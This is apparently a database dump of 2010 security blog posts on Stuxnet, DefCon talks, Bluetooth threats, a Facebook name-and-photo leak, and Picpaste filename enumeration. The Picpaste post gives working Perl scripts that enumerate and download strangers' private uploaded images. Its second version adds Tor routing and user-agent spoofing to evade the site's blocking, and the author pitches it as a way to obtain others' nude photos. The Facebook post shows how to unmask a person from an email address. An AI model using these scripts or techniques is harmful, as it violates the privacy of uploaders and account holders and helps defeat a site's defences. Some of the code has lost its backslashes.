'471','1','open','http://www.attackvector.org/?p=471','0','open','','2','I thought this was a pretty interesting article that I felt I should share.  It talks about the different types of hackers that may have been behind the original stuxnet attack.\n\n(Credit: <a href=\"http://www.symantec.com\" rel=\"nofollow\" target=\"_blank\">Symantec</a>)\nW32.Stuxnet has received a lot of media attention over the last few days. This incident provides almost a complete case study of how these attacks succeed and how they will probably be used in the future. A successful attack allowed the attacker to steal confidential SCADA design and usage documents.\n\nLets start by saying we dont know who is behind the attack, and historically discovering this is very rare. However, if someone proposed this type of attack a month ago, while we would have agreed it was theoretically possible, most would have dismissed such an attack as a movie-plot scenario. Furthermore, attacks of this nature are rarely disclosed publicly.\n<!--more-->\nWe know that the people behind this attack arent amateurs, but their final motive is unclear.\n\nThe principal facts in this case are:\n\n<li>The attackers discovered and used a zero-day vulnerability affecting all versions of Microsoft Windows.</li>\n<li>They developed and used a rootkit to hide their presence.</li>\n<li>They targeted software which is used to control industrial assets and processes; deep knowledge on the product internals was utilized.</li>\n<li>The hackers were able to sign their files using a legitimate digital certificate from an innocent third party. This digital certificate expired in June but a new driver appeared in July; it was also digitally signed using a digital certificate from another company. Both of these companies have offices in Taiwan. The hackers either stole private keys or were able to get their files signed. The attackers may have more compromised digital signatures.\n<li>The hackers did not use a targeted means of attack. Instead, the threat replicates to USB keys and can infect any Windows computer.</li>\n\nThe zero-day vulnerability, rootkit, main binaries, stolen digital certificates, and in-depth knowledge of SCADA software are all high-quality attack assets. The combination of these factors makes this threat extremely rare, if not completely novel.\n\nRead the rest of the article <a href=\"http://www.symantec.com/connect/blogs/hackers-behind-stuxnet\" rel=\"nofollow\" target=\"_blank\">here</a>\n','','2010-07-22 11:01:29','2010-07-22 16:01:29','','','2010-07-22 11:01:29','2010-07-22 16:01:29','the-hackers-behind-stuxnet','0','','publish','The Hackers Behind Stuxnet','post',''),(
'474','4','open','http://www.attackvector.org/?p=474','0','open','','2','So, tomorrow I leave for Las Vegas.  10 days of gambling, drinking, and partaking in sins which will, undoubtedly, either wind me up in prison or hell.  Possibly both.  I\'ve accepted this fate, so I\'m going to push it as far as I can.\n\nPrior to all that, though, I will be attending DefCon 18.  I have finally put together a partial list of the talks that I\'m going to be attending and have decided to share them here.\n\nOn Friday, July 30th, I will be attending the following:\n<!--more-->\n10am - Track 2: SIE Passive DNS and the ISC DNS Database\n11am - Track 2: Cloud Computing, a Weapon of Mass Destruction?\n12pm - Track 2: How Unique is Your Browser?\n1pm - Track 2: Token Kidnappings Revenge\n2pm - Track 2: Lord of the Bing.  Taking Back Search Engine Hacking From Google & Bing\n3pm - Taking a break to go drink and gamble.  Woot!\n4pm - Track 3: Hacking Facebook Privacy\n5pm - Track 1: Mastering the Nmap Script Engine\n\nI haven\'t had a chance yet to sit down and put together my schedule for Saturday, but Friday is looking pretty interesting.  Once I compile my list, I\'ll update this post.\n\nAre any of my readers going to be there?  Maybe we could hook up for a drink or something.  :-D\n\nAnyway, as I\'ve already stated in a previous post, after tomorrow my posts might be few and far between until I return.  I do plan on blogging a bit about the conference and publishing any new tools that are released, but after Saturday, I\'ll be MIA for a week.\n\nSo, to quote Mr. Rogers...\n\n<blockquote>\nThe feeling you know that Ill be back\nWhen the week is new\nAnd Ill have more ideas for you\nAnd youll have things youll want to talk about\nI will, too.\n</blockquote>\n\n...I\'m pretty sure I just hit a new low in the blogging community.','','2010-07-28 09:28:33','2010-07-28 14:28:33','','','2010-07-28 09:28:33','2010-07-28 14:28:33','viva-las-defcon','0','','publish','Viva Las DefCon!','post',''),(
'476','0','open','http://www.attackvector.org/?p=476','0','open','','2','I haven\'t had a chance to write yet but I came across this video from Hak 5 that covers some of the cool stuff that I saw at DefCon 18 this year.\n\nWhen I compile all of my notes, I will be writing a few posts covering the topics that interested me most, but for the time being, check out the video!\n\n<center><object width=\"480\" height=\"270\"><param name=\"movie\" value=\"http://www.dailymotion.com/swf/video/xed4lf_defcon-18-hak5_school?additionalInfos=0\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowScriptAccess\" value=\"always\"></param><embed type=\"application/x-shockwave-flash\" src=\"http://www.dailymotion.com/swf/video/xed4lf_defcon-18-hak5_school?additionalInfos=0\" width=\"480\" height=\"270\" allowfullscreen=\"true\" allowscriptaccess=\"always\"></embed></object><br /></center>','','2010-08-10 14:12:16','2010-08-10 19:12:16','','','2010-08-10 14:12:16','2010-08-10 19:12:16','hak5-defcon-18','0','','publish','Hak5 @ DefCon 18','post',''),(
'480','20','open','http://www.attackvector.org/?p=480','0','open','','2','I want to start by saying that this document is not new.  It\'s floated around the internet for awhile, but it\'s still very, very relevant.  It discusses various different wireless threats (802.11, Bluetooth, et. al) and some easily executed exploits to attack these protocols.\n\nI think anyone who reads my blog is already very, very familiar with the threats against 802.11 networks, but I haven\'t covered the topic of Bluetooth much (at all?).  So, in case you haven\'t thought about the fun that could be had with Bluetooth, consider this:\n<!--more-->\n<li> Class 2 has a range of 10 meters (~32 feet), while a class 1 device has a range of 100 meters (~320 feet)</li>\n<li> It\'s a listening device.  Meaning, when it\'s not in use, it\'s essentially a bug.</li>\n<li> Easily pwnable.  Think about the pin used the last time you paired one of your BT devices.  Probably something like, \"0000\" or \"1234\", right?  Yeah....</li>\n<li> It\'s everywhere.  People walk around with their BT headset in wherever they go.  Beyond that, BT is built in to cars these days, and if not built into your car, it\'s probably built into the GPS that you put in your car (ie - Garmin Nuvi\'s).</li>\n\nJust so I\'m clear, this does not involve you being in an active conversation on the phone while using your BT device, this is you coming home and putting your headset on the counter and me listening to everything you say inside your house.  Or, me being stuck in traffic next to you and listening inside of your car through the BT in your Nuvi.\n\nAnyway, I think I\'m going to spend some more time focusing on Bluetooth.  It\'s not really an attack vector that I use during penetration testing currently, but I could see it being a very, very handy tool to have in my arsenal for social engineering purposes.\n\n<a href=\"http://www.attackvector.org/files/Wireless_Threats_Practical_Exploits.pdf\">Here\'s the link</a> to the document that was written by Joshua Wright @ Aruba Networks and is definitely a worth while quick read.\n\nUPDATE:\n\nHere\'s a video that was sent to me by one of my readers that demonstrates the process described in the document.\n\n<center>\n<object width=\"480\" height=\"385\"><param name=\"movie\" value=\"http://www.youtube.com/v/1c-jzYAH2gw&amp;hl=en_US&amp;fs=1\"></param><param name=\"allowFullScreen\" value=\"true\"></param><param name=\"allowscriptaccess\" value=\"always\"></param><embed src=\"http://www.youtube.com/v/1c-jzYAH2gw&amp;hl=en_US&amp;fs=1\" type=\"application/x-shockwave-flash\" allowscriptaccess=\"always\" allowfullscreen=\"true\" width=\"480\" height=\"385\"></embed></object>\n</center>','','2010-08-11 10:21:32','2010-08-11 15:21:32','','','2010-08-11 10:21:32','2010-08-11 15:21:32','wireless-threats-and-practical-exploits','0','','publish','Wireless Threats and Practical Exploits','post',''),(
'483','8','open','http://www.attackvector.org/?p=483','0','open','','2','UPDATE:\n\nIt appears that Facebook got the hint and decided that they would fix this \"feature\" prior to winding up in the spotlight for yet another privacy issue.  I would assume that they got quite a few responses from people after this came across on Full Disclosure.  :-)\n---\n\nThis came across on Full Disclosure.  I\'ve known about this for awhile but never really thought much of it.. mostly because I figured it had to do with the end users privacy settings, but it turns out that that is not the case.\n\nRegardless of privacy settings, you can supply Facebook with an email address and *incorrect* password and obtain that users full name and their profile picture.  Let me demonstrate:\n<!--more-->\n\nWe\'re going to use our old friend Steve as the example here.  We know his email address, which is steve.nicholas@itex.net, so we go to www.facebook.com and put that in the \"email\" field and for password, we use \"dolgiuodgoijg\", or some other random, incorrect password.  :-)\n\nWhat Facebook returns is:\n\n<center><img src=\"http://www.attackvector.org/pics/stevepass.png\"></center>\n\n(It\'s in German because Facebook thought that I was coming from Germany.. so it was trying to be helpful.)\n\nSo, we have his full name and his profile picture.  Granted, in this example his full name is actually his email address, but.. in the event of an email address like, \"elitehacker@gmail.com\", you could obtain his/her real name and what he/she looks like.  Then, using the method I described in my post \"<a href=\"http://www.attackvector.org/social-sites-profile-pictures-and-privacy/\">Social Sites, Profile Pictures and Privacy</a>\", you could probably discover a lot more information about this person.\n\nBy itself, this isn\'t all that wonderful, but used in conjunction with other information gathering tricks, this could be very useful.  ;-)\n\n','','2010-08-11 14:59:07','2010-08-11 19:59:07','','','2010-08-11 14:59:07','2010-08-11 19:59:07','facebook-name-picture-extraction','0','','publish','Facebook Name & Picture Extraction','post',''),(
'487','17','open','http://www.attackvector.org/?p=487','0','open','','2','[UPDATE]:\n\nSo, after I released this, Picpaste decided to try blocking access based on the user agent.  One of my readers (Thanks Mark!) supplied updated code that used a different LWP module to manipulate the user agent and changed the \'wget\' command to supply a fake user agent.\n\nWell, they caught on to that as well and decided to block access after X number of bad requests.  I took my original code, Mark\'s code, and new code, and created version 2 of my script which circumvents their attempts at blocking access.  It\'s pasted below.\n\n[/UPDATE]\n\nCatchy title, eh?\n\nI\'m sure most of you are familiar with the service \"picpaste\", which is, as the name implies, a simple service where people can upload a picture and give out the link to the picture for others to see, rather than having to send the actual picture through email, IM, whatever.\n\nSounds innocent enough, right?  Well.. not really.  Any service that allows you to \"anonymously\" upload data can be abused.  What I\'ve noticed is that a lot of people use picpaste for is uploading pornographic material.  The idea of someone posting naked pictures of themselves to a website that is supposedly anonymous and not available to the public is kind of hilarious.  I mean, what if the servers were to be hacked, or someone figured out a way to find the pictures.. do you really want nude pictures of you floating around the internet?\n<!--more-->\nWell, here\'s the problem with picpaste.  When you upload a picture (lets call it myrack.jpg).. picpaste adds it to their database as \"myrack.epochtime.jpg\", which means that enumeration would be.... difficult.  You\'d have to know the name of the picture and the time that it was uploaded in order to get it.  This is unlikely.\n\nHowever, the url that picpaste creates for the picture that you\'ve uploaded is a bit more simple.  When I upload my picture, I\'m given the link of \"www.picpaste.com/myrack.jpg\".  And if I upload the same picture again, they change the file name to \"myrack_1.jpg\".  So, duplicate file names are given a sequential number.  That makes enumeration trivial.\n\nWhen you visit the url, you\'ll notice that you can click on the image and by clicking on it, it will bring you to the original, fullsize picture.  And, by looking at the source code of the page, you\'ll see the path to \"myrack.epochtime.jpg\".  Bingo.  So now all you\'d have to do is write a script to automate the enumeration in order to find pictures of the subject matter that you\'re looking for...... ahem.\n\n<pre>\n$ ./picpaste.pl sexy\nFound: http://www.picpaste.com/pics/sexy.1281975513.jpg\nFound: http://www.picpaste.com/pics/sexy_1.1281975514.jpg\nFound: http://www.picpaste.com/pics/sexy_2.1281975514.jpg\nhttp://www.picpaste.com/sexy_3.jpg - Nothing found\nhttp://www.picpaste.com/sexy_4.jpg - Nothing found\nhttp://www.picpaste.com/sexy_5.jpg - Nothing found\n</pre>\n<p></p>\nWell, one thing is for sure, people have varying opinions of what is sexy and what is not... bleh.\n\nAnyway, here\'s the PoC.. it\'s pretty simple and featureless, but it gives you the idea.\n\n<pre lang=\"perl\" line=\"1\">\n#!/usr/bin/perl\nuse LWP::Simple;\n\n$word = $ARGV[0];\n\nif($word eq \"\") {\n  print \"Usage: $0 <picturename>n\";\n  print \"IE: $0 dogsn\";\n  print \"Note: Leave off the trailing .jpgn\";\n  exit(0);\n}\n\nwhile(1) {\n  if($i >= 1) {\n    $sw = join(\"_\", $word, $i);\n  } else {\n    $sw = $word;\n  }\n  \n  $url = \"http://www.picpaste.com/$sw.jpg\";\n  if(($body = get($url)) ne \"\") {\n    if($body =~ /.*?href=\"/(pics/.*?)\"s+title=\"$sw.jpg.*/) {\n      print \"Found: http://www.picpaste.com/$1n\";\n      system(\"wget -q http://www.picpaste.com/$1\");\n    }\n  } else {\n    print \"$url - Nothing foundn\";\n  }\n  $i++;\n}\n</pre>\n\nPS:  Yes, I was bored when I wrote this script.. ;-)\n\n[UPDATE]:\n\nHere is the new code.. with TOR support and useragent spoofing!  :-)\n\n<pre lang=\"perl\" line=\"1\">\n\n#!/usr/bin/perl  \nuse LWP::UserAgent;   \n\n$word = $ARGV[0];\n\nif($word eq \"\") {\n  print \"Usage: $0n\";\n  print \"IE: $0 dogsn\";\n  print \"Note: Leave off the trailing .jpgn\";\n  exit(0);\n}\n\nsystem(qw(export http_proxy=\"http://localhost:8118\"));\n\nwhile(1) {\n  if($i >= 1) {\n  $sw = join (\"_\", $word, $i);\n  } else {\n    $sw = $word;   \n  }\n\n  $ua = LWP::UserAgent->new;\n  $ua->agent(\'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.12) Gecko/20080201 Firefox/3.6.1.1\');\n  $ua->timeout(10);\n  $ua->proxy([qw/ http /] => \'socks://localhost:8118\');\n\n  $url = \"http://www.picpaste.com/$sw.jpg\";\n\n  $res = $ua->get($url);\n  if($res->is_success) {\n    my $body = $res->content;\n    if($body =~ /.*?href=\"/(pics/.*?)\"s+title=\"$sw.jpg.*/s) {\n      print \"Found $1n\";\n      system(\"wget -q -U \'Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.12) Gecko/20080201 Firefox/3.6.1.1\' http://www.picpaste.com/$1\");\n    } else {\n      print \"$url - Nothing foundn\";\n    }\n  }\n  $i++;\n}\n</pre>\n<p></p>\nWhat you\'ll need:\n\n1) Tor (sudo apt-get install tor)\n2) Socks support for LWP::UserAgent (sudo cpan LWP::Protocol::socks)\n3) Polipo (sudo apt-get install polipo)\n\nEnjoy.  :-)\n\nThree words for the guys over at Picpaste:\n\nRandom. URL. Tokens.\n','','2010-08-16 11:29:32','2010-08-16 16:29:32','','','2010-08-16 11:29:32','2010-08-16 16:29:32','picpaste-filename-enumeration-or-how-to-get-free-porn','0','','publish','UPDATED: Picpaste & Filename Enumeration.  Or, How To Get Free Porn.','post','');
